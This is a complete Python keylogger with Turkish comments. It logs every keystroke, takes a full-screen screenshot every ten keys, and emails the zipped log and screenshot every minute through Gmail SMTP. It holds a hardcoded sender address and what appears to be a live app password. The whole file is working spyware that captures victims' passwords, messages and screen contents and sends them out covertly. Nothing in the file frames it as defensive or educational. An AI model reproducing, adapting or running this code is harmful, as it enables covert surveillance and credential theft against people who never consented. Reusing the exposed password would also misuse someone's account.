import pynput
from pynput.keyboard import Key, Listener
import time
from PIL import ImageGrab
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import os
import zipfile
import threading  # threading modülünü ekleyin

def zipdosyasi(filenames):
    zip_filename = "attachments.zip"

    # Zip dosyası oluştur
    with zipfile.ZipFile(zip_filename, "w") as zipf:
        for filename in filenames:
            # Dosyayı zip'e ekle
            zipf.write(filename, os.path.basename(filename))

    return zip_filename

def fullscreen_screenshot():
    full_screen = ImageGrab.grab()  # Tüm ekranı al
    full_screen.save("full_screen_screenshot.png")  # Kaydet

def clear_log():
   os.remove("log.txt")
def sendmail(toaddr, subject, body, filenames=[]):
    fromaddr = "bbayir686@gmail.com"  # Gönderici e-posta adresi
    password = "sdhd hrlf lfvg frfi"  # Gönderici e-posta hesap şifresi

    # Ekleri zip dosyasına sıkıştır
    zip_filename = zipdosyasi(filenames)

    # E-posta oluştur
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    # Zip dosyasını ek olarak ekle
    attachment = open(zip_filename, "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % zip_filename)
    msg.attach(part)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(fromaddr, password)
        text = msg.as_string()
        server.sendmail(fromaddr, toaddr, text)
        server.quit()
        print("E-posta gönderildi!")

        # Zip dosyasını temizle
        os.remove(zip_filename)

    except Exception as e:
        print("Hata:", str(e))

# Kullanım örneği:
toaddr = "bbayir686@gmail.com"  # Alıcı e-posta adresi
subject = "Keylogger Mail"
body = "Bu ek, keylogger'ın 1 dakika içinde topladığı verilerin zip dosyası şeklinde sıkıştırılmış halidir."
filenames = ["log.txt", "full_screen_screenshot.png"]    # Eklenecek dosyanın adı (eğer yoksa None olarak bırakabilirsiniz)

count = 0
count_txt = 0
keys = []

def on_press(key):
    global keys, count, count_txt
    keys.append(key)
    count += 1
    count_txt += 1
    if count >= 10:
        count = 0
        write_file(keys)
        fullscreen_screenshot()
        keys = []
    if count_txt >= 6000: #6000 karakterden sonra log.txt'yi sil
        clear_log()
        count_txt = 0

def artan_deger():
    deger = 0
    while True:
        deger += 1
        if deger == 60: # 60 saniyede bir olsun
            threading.Thread(target=sendmail, args=(toaddr, subject, body, filenames)).start()
            deger = 0
        time.sleep(1)

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") > 0:
                f.write(' ')
            elif k.find("key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

# Zamanlayıcı işlemini başlat
timer_thread = threading.Thread(target=artan_deger)
timer_thread.daemon = True  # Ana program sonlandığında bu thread'i sonlandır
timer_thread.start()

# Dinleme işlemini başlat
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
